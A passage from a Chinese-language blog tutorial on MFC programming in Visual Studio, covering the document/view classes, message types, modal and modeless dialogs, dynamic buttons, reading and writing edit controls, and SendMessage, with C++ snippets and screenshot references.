GetThisClass();</code></li><li>正常的派生类下来，并不会刻意保留父类叫什么，而mfc做了一些优化</li></ul></li><li>支持动态创建以及支持对象诊断输出<ul><li><code>virtual void AsserValid() const;</code></li><li><code>virtual void Dump(CDumpContext&amp; dc) const;</code></li><li>当mfc启动时，有些需求不是立马就创建的，只有当触发的时候才会创建</li></ul></li></ul><p>有这么一个超级基类的存在，就提供了无限的可能，但是这种级别的东西不适合个人开发。</p><hr><h2 id="mfc框架理论"><a href="#mfc框架理论" class="headerlink" title="mfc框架理论"></a>mfc框架理论</h2><h3 id="关键类"><a href="#关键类" class="headerlink" title="关键类"></a>关键类</h3><p><code>CWinApp</code>:MFC应用程序抽象，负责管理Document Template<br><code>CFrameWnd</code>:框架窗口、负责创建应用的主窗口，含标题栏、菜单栏、工具栏、状态栏等<br><code>CView</code>:负责展示应用数据，View其实是一个没有边框的窗口，客户区<br><code>CDocument</code>:负责存储应用数据</p><hr><h3 id="关键类之间的关系"><a href="#关键类之间的关系" class="headerlink" title="关键类之间的关系"></a>关键类之间的关系</h3><p>CDocTemplate、CDocument、CView、CFrameWnd关系</p><ul><li>CWinApp 拥有一个对象指针：CDocManager *m_pDocManager</li><li>CDocManager拥有一个指针链表CPtrList m_templateList，用来维护一系列的DocumentTemplate。应用程序在CMyWinApp::InitInstance中以AddDocTemplate将这些Document Templates加入到有CDocTemplate所维护的链表之中</li><li>CDocTemplate拥有三个成员变量，分别持有Document、View、Frame的CRuntimeClass指针，另有一个成员变量m_nIDResource，用来表示此Document显示时应该采用的UI对象。这四位数据在CMyWinApp::InitInstance函数构造CDocTemplate时指针，称为构造函数的参数。</li><li>CDocument有一个成员变量CDocTemplate *m_pDocTemplate，回指其DocumentTemplate；另外有一个成员变量CPtrList m_viewList，表示它可以同时维护一组Views。</li><li>CFrameWnd有一个成员变量Cview *m_pViewActive，指向当前活动的View</li><li>CView有一个成员变量CDocument *m_pDocument，指向相关的Document</li></ul><p>结构层次化都是为了方便开发和维护。</p><hr><h3 id="消息分类"><a href="#消息分类" class="headerlink" title="消息分类"></a>消息分类</h3><p>mfc消息的分类大致分为三种：标准消息、命令消息、通告消息。</p><ol><li>标准消息：除WM_COMMAND之外，所有以WM_开头的消息。从CWnd类派生的类都可以接受到这一类消息</li><li>命令消息：来自菜单、加速键或者工具栏按钮的消息。这类消息都以WM_COMMAND呈现。在MFC中，通过菜单项的标识(id)来区分不同的命令消息；在sdk中，通过消息的wParam参数识别。从CCmdTarget(CWnd的父类)派生的类都可以接收到这一类消息</li><li>通告消息：由控件产生的消息，例如按钮的单击，列表框的选择等均会产生此类消息，为的是向其父窗口(通常为对话框)通知时间的发生。这类消息也是以WM_COMMAND形式呈现。从CCmdTarget(CWnd的父类)派生的类都可以接收到这一类消息。</li></ol><p>小结：凡是从Cwnd派生的类，即可以接受标准消息，也可以接收命令消息和通告消息。<br>而对于那些从CCmdTarget派生的类，则只能接受命令消息和通告消息，不能接受标准消息。</p><hr><h2 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h2><p>是与用户进行交互的控件，如文件对话框、字体对话框、颜色对话框等，一般用于告示、提醒等。</p><img src="/2022/07/25/mfc01/042.png" class=""><p>app这个是之前创建的对话框，从类视图可以看到只有三个类。比文档的结构观感上要简洁不少。</p><p>其中标准消息可以直接通过类视图-&gt;选择项目的类-&gt;属性里面找到消息即可。</p><p>对话框其实就是一个窗口，它不仅可以接收消息，而且还可以被移动或者关闭，甚至是在客户区中进行绘图。这些都是有CWnd类派生而来。</p><img src="/2022/07/25/mfc01/043.png" class=""><p>其中除了最基础的消息，还有控件</p><img src="/2022/07/25/mfc01/044.png" class=""><p>利用拖动控件的方式，可以省去很多麻烦。</p><hr><h3 id="创建对话框"><a href="#创建对话框" class="headerlink" title="创建对话框"></a>创建对话框</h3><p>同样的，已有的几个是根据项目类型产生的，我们当然可以进行创建<br>在资源视图中，选这个项目的Dialog，然后右击添加资源</p><img src="/2022/07/25/mfc01/045.png" class=""><p>这里不选子类直接选Dialog也是可以的。</p><img src="/2022/07/25/mfc01/046.png" class=""><p>通过Dialog创建的它的对话框属性只有一个id能修改，问题不大，改个有意义的就行</p><img src="/2022/07/25/mfc01/047.png" class=""><p>资源属性这边能改的就很多。</p><p>图形化的做完了，代码实现部分就需要类去控制它</p><img src="/2022/07/25/mfc01/048.png" class=""><p>直接右击添加类，类名随便写尽量有意义，然后继承的基类，一般是这头两个。ex说过就是拓展的意思。</p><p>这种通过简单的方式创建出模板的好处就是省去了一些小麻烦，也不容易出问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="comment">//MessageBox(_T(&quot;你好呀!&quot;));</span></span><br><span class="line">CBingDialog dlg;</span><br><span class="line">dlg.<span class="built_in">DoModal</span>();</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnOK</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主窗口的确认按钮下设置，将我们新建的CBingDialog作为模块化弹出</p><img src="/2022/07/25/mfc01/049.png" class=""><p>当dlg弹出之后，原先的窗口是不可改变的状态，只有dlg关闭之后才能操作后面的对话框。</p><p><code>DoModal</code>这就是所谓的模态对话框，有的时候会觉得不太方便吧，但是如果是警示之类的还是挺好的。</p><p>有模态化就有非模态化的，非模态化的一个问题其实猜也能猜到，就是因非模态化而产生的对话框不会卡住，如果这个变量优先级不够，很有可能在不知道的地方就被析构释放了，在逻辑上会导致很严重的问题，而且设置起来也较为麻烦。</p><p><strong>首先因为没有锁或者说阻塞，所以当按钮按下的适合，这个新建的对话框一闪而过，结束的很快。</strong><br>所以要在头文件类中建一个全局变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CMFCApplication1Dlg</span> : <span class="keyword">public</span> CDialogEx</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 构造</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">CMFCApplication1Dlg</span>(CWnd* pParent = <span class="literal">nullptr</span>);<span class="comment">// 标准构造函数</span></span><br><span class="line">CBingDialog dlg;<span class="comment">//注意引用头文件不然是未定义的类型</span></span><br><span class="line"><span class="comment">//....后面的省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后又要在对话框源文件中，找到oninitdialog函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">dlg.<span class="built_in">Create</span>(IDD_DIALOG_NEW, <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>在这完成初始化。</p><p>最后在按钮消息中触发显示</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">dlg.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到非模态化的对话框设置起来就要挺多步骤了。</p><img src="/2022/07/25/mfc01/050.png" class=""><p>非模态化的效果就是不会阻塞，后面的窗口是可以操作的。</p><p>或者你可以直接在对话框源文件中定义全局变量<code>CBingDialog dlg;</code><br>然后再按钮消息中设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">dlg.<span class="built_in">Create</span>(IDD_DIALOG_NEW, <span class="keyword">this</span>);</span><br><span class="line">dlg.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是可行的，因为这个dlg变量不会再按钮结束后立马被析构掉。</p><p><strong>总而言是，模态化对话框的使用场景肯定是基于会修改影响到其他窗口，这个时候肯定要设置称模态化对话框去阻塞，不然改动了还原的部分都没的操作了。非模态像vs的视图吧，这些对话框不会直接影响主窗口的就适用于非模态</strong></p><hr><h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><p>按钮的创建，从图形化角度，直接拖动控件是最直接的，拖动完成后保存，然后双击这个按钮直接会跳转到代码界面，你就可以编辑这个按钮消息能干什么了。</p><img src="/2022/07/25/mfc01/051.png" class=""><p>新建一个按钮，修改一下描述文字和id，然后双击开始编辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedButtonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老样子在日志里输出文件路径，行号，函数名。</p><img src="/2022/07/25/mfc01/052.png" class=""><p>这玩意肯定是不会有啥问题了。</p><img src="/2022/07/25/mfc01/053.png" class=""><p>至于动态布局，就是比例放大或者缩小的适合这个按钮的位置会自动调整，不设置的话窗口放大或者缩小它的位置都不会改变。</p><p>其它的一些行为都有中文描述可以自己试一下。</p><p>然后就是通过按钮去创建自定义按钮，本质上就是手动整活了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CButton m_Btn;<span class="comment">//自定义按钮</span></span><br></pre></td></tr></table></figure><p>在头文件中肯定要预先定义这个空的按钮。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedButtonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( m_Btn.m_hWnd == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">m_Btn.<span class="built_in">Create</span>(_T(<span class="string">&quot;动态&quot;</span>), BS_DEFPUSHBUTTON | WS_VISIBLE | WS_CHILD, <span class="built_in">CRect</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">150</span>), <span class="keyword">this</span>, <span class="number">9999</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>BS_DEFPUSHBUTTON | WS_VISIBLE | WS_CHILD</code><br>BS开头就是button style，按钮自带的样式，WS就是 windows style，译为windows系统的样式，具体种类可以转到定义，有不少这样的类型。</p><p><strong>注意下最后的id，不要通过变量传递去改变，一定要固定为主，避免冲突或者广播，因为id重了，获取消息的时候就可能一起接收或者发送</strong></p><img src="/2022/07/25/mfc01/054.png" class=""><p>跑起来之后，点击test_button之后就会弹出这个动态的按钮，看上去可能有点潦草，毕竟是随便建的。</p><blockquote><p>如果采用全局变量dlg是在源文件的要注意一下<br>可能存在窗口创建多次报错</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( dlg.m_hWnd == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">dlg.<span class="built_in">Create</span>(IDD_DIALOG_NEW, <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">dlg.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给他加个验证以防万一</p><p><strong>动态按钮的创建，还是随着用户改变为主，一般用的少</strong><br>不过没启用之前也不占资源倒是一件好事，顶多留个指针。</p><hr><h2 id="控件"><a href="#控件" class="headerlink" title="控件"></a>控件</h2><p>正常情况下，我们知道访问这个控件，比如按钮，肯定是在当前窗口访问最直接也不需要额外操作，但是别的窗口如果要访问，就是另一回事了。</p><img src="/2022/07/25/mfc01/055.png" class=""><p>首先给这个对话框里面添加三个文本框，默认是空的，通过别的地方传递给这个文本框一个初始值。</p><p>在自定义的对话框初始化一个文本框之前需要注意，我们自定义的他少一个标准的函数<code>OnInitDialog()</code>作为初始化用</p><p>打开类视图-&gt;找到这个项目选择CBingDialog-&gt;然后属性那边有个重写往下滑找到<code>OnInitDialog()</code>点击后面add即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CBingDialog::OnInitDialog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="访问文本框"><a href="#访问文本框" class="headerlink" title="访问文本框"></a>访问文本框</h3><p>通过父类CWnd，我们可以直接在对话框初始化这些文本框</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CBingDialog::OnInitDialog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line">CWnd *pEdit01 = <span class="built_in">GetDlgItem</span>(IDC_EDIT_ONE);</span><br><span class="line">CWnd *pEdit02 = <span class="built_in">GetDlgItem</span>(IDC_EDIT_TWO);</span><br><span class="line">CWnd *pEdit03 = <span class="built_in">GetDlgItem</span>(IDC_EDIT_THREE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( pEdit01 != <span class="literal">NULL</span> ) pEdit01-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;100&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> ( pEdit02 != <span class="literal">NULL</span> ) pEdit02-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;200&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> ( pEdit03 != <span class="literal">NULL</span> ) pEdit03-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;300&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/056.png" class=""><p>这个setwindowstext不仅能设置，还能取出值，类型应是Cstring</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CString setText;</span><br><span class="line">pEdit01-&gt;<span class="built_in">SetWindowText</span>(strText);</span><br></pre></td></tr></table></figure><p>用父类的CWnd去接收可能有点麻烦，但是至少能判断是否获取成功了<br>因为还有一种直接的方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetDlgItemText</span>(IDC_EDIT_ONE, _T(<span class="string">&quot;100&quot;</span>));</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(IDC_EDIT_ONE, strText);</span><br></pre></td></tr></table></figure><p>这种方式呢，主要是产生错误的时候你也不晓得是前者不存在，还是后者溢出。</p><p>还有一种是针对无符号整型的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetDlgItemInt</span>(IDC_EDIT_THREE, <span class="number">300</span>);</span><br><span class="line">BOOL isTrans = FALSE;</span><br><span class="line">UINT ret = <span class="built_in">GetDlgItemINt</span>(IDC_EDIT_THREE, &amp;isTrans);</span><br></pre></td></tr></table></figure><p>加这个布尔值的意思是，如果传输成功，这个布尔值就会变成TRUE，那么ret的值自然就是300，到不太在意ret了，如果还是FALSE，则说明传递失败了。</p><hr><h3 id="添加变量"><a href="#添加变量" class="headerlink" title="添加变量"></a>添加变量</h3><p>先去Diglog页面，选中文本框右击，添加变量打开即可。</p><img src="/2022/07/25/mfc01/057.png" class=""><p>选择类别，一种是值一种是控件，这边现用值，名称看着来。<br>选择类别为值后，变量的类型也需要确定，默认来说字符串Cstring更合适，这边先用int玩，注释就更不用说了。</p><img src="/2022/07/25/mfc01/058.png" class=""><p>选择int这种值类型，在其他这里就会有最小值和最大值的分别。最大字符数是给字符串类型用的，至于下面的文件倒不用特意选了，毕竟这个添加变量是在CBingDialog下添加的，默认就在这里。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CBingDialog 对话框</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CBingDialog</span> : <span class="keyword">public</span> CDialogEx</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CBingDialog)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">CBingDialog</span>(CWnd* pParent = <span class="literal">nullptr</span>);   <span class="comment">// 标准构造函数</span></span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CBingDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对话框数据</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> AFX_DESIGN_TIME</span></span><br><span class="line"><span class="keyword">enum</span> &#123; IDD = IDD_DIALOG_NEW &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CButton m_Btn;<span class="comment">//自定义按钮</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>;    <span class="comment">// DDX/DDV 支持</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">DECLARE_MESSAGE_MAP</span>()</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function">afx_msg <span class="type">void</span> <span class="title">OnBnClickedButtonTest</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> BOOL <span class="title">OnInitDialog</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 文本框1的值</span></span><br><span class="line">    <span class="type">int</span> m_Value1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>能看到下面有个注释，然后是我们新增的变量。<br>在源文件中同样有初始化的地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span> </span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Text</span>(pDX, IDC_EDIT_ONE, m_Value1);</span><br><span class="line"><span class="built_in">DDV_MinMaxInt</span>(pDX, m_Value1, <span class="number">-9999</span>, <span class="number">9999</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别的不说，这个绑定在文本框的id和名称，还有下面的最大值最小值肯定看得出来。</p><p><strong>那么肯定会好奇绑定这个值类型的变量有什么用？</strong></p><p>给另外两个文本框都添加变量<br>然后给确定按钮写代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();<span class="comment">//无参数默认为TRUE，此时把界面的值传到变量</span></span><br><span class="line">m_Value3 = m_Value1 + m_Value2;</span><br><span class="line"><span class="built_in">UpdateData</span>(FALSE);<span class="comment">//为FALASE时，把值传回到界面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CDialogEx::OnOK();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是按下之后，文本框三的内容是1+2的就对了。<br>这里随便修改一下文本框2的内容，然后再按下确认，能看到文本框3的内容改变了</p><img src="/2022/07/25/mfc01/059.png" class=""><hr><h3 id="添加控件"><a href="#添加控件" class="headerlink" title="添加控件"></a>添加控件</h3><p>方法一致，在Dialog视图中右击文本框添加变量，只不过类型改成控件<br>当三个都添加完成之后编写代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"></span><br><span class="line">CString str1, str2, str3;</span><br><span class="line">m_Edit1.<span class="built_in">GetWindowText</span>(str1);</span><br><span class="line">m_Edit2.<span class="built_in">GetWindowText</span>(str2);</span><br><span class="line"><span class="type">int</span> t = _wtoi(str1) + _wtoi(str2);</span><br><span class="line">TCHAR buf[<span class="number">32</span>] = _T(<span class="string">&quot;&quot;</span>);</span><br><span class="line">_itow_s(t, buf, <span class="number">10</span>);</span><br><span class="line">str3 = buf;</span><br><span class="line">m_Edit3.<span class="built_in">SetWindowText</span>(str3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CDialogEx::OnOK();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控件创建的时候变量类型是CEdit，那么推测也是跟字符串有关的，所以在做加法之前先完成一个转换。<br>最后得到的结果也是成功的</p><img src="/2022/07/25/mfc01/060.png" class=""><p>虽然肯能不是很实用，但是总归是个小技巧</p><hr><h3 id="SendMessage"><a href="#SendMessage" class="headerlink" title="SendMessage"></a>SendMessage</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SendMessage</span>(WM_GETTEXT);</span><br><span class="line"><span class="built_in">SendMessage</span>(WM_SETTEXT);</span><br></pre></td></tr></table></figure><p>不过这俩在函数内部，其实也不知道发给谁，顶多是传给往上一层的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedButtonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( m_Btn.m_hWnd == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">m_Btn.<span class="built_in">Create</span>(_T(<span class="string">&quot;动态&quot;</span>), BS_DEFPUSHBUTTON | WS_VISIBLE | WS_CHILD, <span class="built_in">CRect</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">150</span>), <span class="keyword">this</span>, <span class="number">9999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TCHAR buf[<span class="number">20</span>] = _T(<span class="string">&quot;&quot;</span>);</span><br><span class="line">::<span class="built_in">SendMessage</span>(m_Edit1.m_hWnd, WM_GETTEXT, <span class="number">20</span>, (LPARAM)buf);</span><br><span class="line">m_Edit1.<span class="built_in">SendMessage</span>(WM_SETTEXT, <span class="built_in">sizeof</span>(buf), (LPARAM)buf);</span><br><span class="line"><span class="built_in">SendMessage</span>(WM_GETTEXT, <span class="number">20</span>, (LPARAM)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老实说这后面的在干什么我也看不懂了。<br>不过打断点调试之后，看到buf的值是取了这个窗口的标题</p><img src="/2022/07/25/mfc01/061.png" class=""><p>不过按照推理<code>m_Edit1.m_hWnd</code>这个应该是通过控件获取到这个当前窗口句柄了，然后get句柄的Text属性到buf上，之所以能找到这个窗口句柄感觉还是因为<code>::</code>全局作用域的关系，然后后面这个文本框发送消息到buf上这个说法上不太通顺，因为用文本框发送消息和按钮按下后发送消息，buf理论都一样了吧，毕竟是从窗口句柄取值的。</p><p><strong>打个？后面碰到了在细究</strong></p><hr><h2 id="对话框伸缩"><a href="#对话框伸缩" class="headerlink" title="对话框伸缩"></a>对话框伸缩</h2><p>其实窗口是有自带的缩放，但是这里先自定义两个按钮去实现</p><img src="/2022/07/25/mfc01/062.png" class=""><p>控件拖动完毕后，修改一下id，然后双击按钮跳到代码编辑部分。</p><p>放大还是缩小总归是要知道窗口的大小先</p><p>现在头文件里预定一大一小</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//窗口大小</span></span><br><span class="line">CRect m_large;</span><br><span class="line">CRect m_small;</span><br></pre></td></tr></table></figure><p><strong>注：CRect有四个成员分别是left,top这二者代表矩形左上角顶点坐标，right，bottom代表矩形右下角的坐标，草图如下：</strong></p><img src="/2022/07/25/mfc01/068.png" class=""><p>然后在源文件的<code>OnInitDialog()</code>初始化一下</p><figure class="highlight 